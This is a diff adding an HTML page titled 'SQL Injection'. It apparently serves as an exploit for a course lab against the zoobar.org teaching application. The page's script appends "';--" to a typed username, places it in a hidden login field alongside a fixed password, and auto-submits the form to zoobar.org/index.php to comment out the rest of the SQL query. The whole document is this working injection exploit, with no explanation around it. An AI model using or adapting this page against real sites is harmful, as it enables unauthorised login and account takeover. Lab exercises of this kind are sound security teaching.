@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SQL Injection</title>
+</head>
+<body>
+<input id ="name" type="text">
+<form id = "form" action="http://zoobar.org/index.php" name="loginform" method="POST">
+    <input type="hidden" id = "hiddenname" name="login_username" value="" />
+    <input type="hidden" name="login_password" value="user" />
+    <input type="hidden" style="height:1px; width: 1px;" name="submit_registration" id="login" value="">
+</form>
+<button id="b" type="button" onclick=submit()>Log in</button>
+<script>
+    window.onload = function(){
+
+    };
+    function submit() {
+        var name = document.getElementById("name").value;
+        name = name+"';--"+Math.random();
+        // name = escapeHtml(name);
+        var temp = document.getElementById("hiddenname");
+        temp.value = name;
+        var bu = document.getElementById("login");
+        bu.type = "submit";
+        document.getElementById("b").type="hidden";
+        document.getElementById("login").click();
+    }
+</script>
+</body>
+</html>
